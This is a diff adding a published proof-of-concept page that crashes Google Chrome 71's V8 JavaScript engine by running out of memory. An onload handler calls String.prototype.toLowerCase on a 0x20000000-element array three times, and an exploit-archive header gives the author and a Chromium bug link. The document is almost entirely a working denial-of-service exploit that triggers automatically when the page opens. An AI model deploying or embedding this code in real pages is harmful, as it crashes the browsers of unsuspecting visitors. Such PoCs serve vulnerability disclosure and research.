@@ -1,0 +1,34 @@
+<!--
+# Exploit Title: Google Chrome 71.0.3578.98 V8 JavaScript Engine - Out-of-memory. Denial of Service (PoC)
+# Google Dork: N/A
+# Date: 2018-12-23
+# Exploit Author: Bogdan Kurinnoy (b.kurinnoy@gmail.com)
+# Vendor Homepage: https://www.google.com/
+# Version: Google Chrome 71.0.3578.98, V8 version 7.3.0 (candidate)
+# Tested on: Windows x64
+# CVE : N/A
+
+# Description:
+
+# Fatal javascript OOM in CALL_AND_RETRY_LAST
+
+# https://bugs.chromium.org/p/chromium/issues/detail?id=917631
+-->
+
+<html>
+<head>
+<script>
+
+function main() {
+
+var vArr = new Array();
+var bigArray = new Array(0x20000000);
+vArr[0] = String.prototype.toLowerCase.call(bigArray);
+vArr[1] = String.prototype.toLowerCase.call(bigArray);
+vArr[2] = String.prototype.toLowerCase.call(bigArray);
+
+}
+</script>
+</head>
+<body onload=main()></body>
+</html>
